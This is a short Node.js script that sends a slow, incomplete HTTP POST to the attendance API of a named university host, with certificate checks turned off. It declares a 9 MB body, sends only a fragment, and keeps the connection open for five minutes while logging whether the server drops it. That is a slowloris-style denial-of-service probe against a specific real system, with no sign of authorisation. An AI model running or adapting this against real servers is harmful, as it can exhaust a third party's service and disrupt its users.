import tls from "node:tls";
const H="attendance.knust.edu.gh";
const t0=Date.now();
const s=tls.connect({host:H,port:443,servername:H,rejectUnauthorized:false},()=>{
 s.write(`POST /api/sessions/11111111-1111-4111-8111-111111111111/attend/ HTTP/1.1\r\nHost: ${H}\r\nContent-Type: multipart/form-data; boundary=--x\r\nContent-Length: 9437184\r\nConnection: keep-alive\r\n\r\n------x\r\nContent-Disposition: form-data; name="student_id"\r\n\r\n23345678\r\n`);
});
s.on("data",d=>console.log(((Date.now()-t0)/1000|0)+"s DATA",d.toString().slice(0,80)));
s.on("close",()=>{console.log(((Date.now()-t0)/1000|0)+"s SERVER CLOSED");process.exit(0)});
s.on("error",e=>console.log("ERR",e.code));
setInterval(()=>console.log(((Date.now()-t0)/1000|0)+"s alive",!s.destroyed),30000);
setTimeout(()=>{console.log("TIMEUP alive=",!s.destroyed);process.exit(0)},300000);
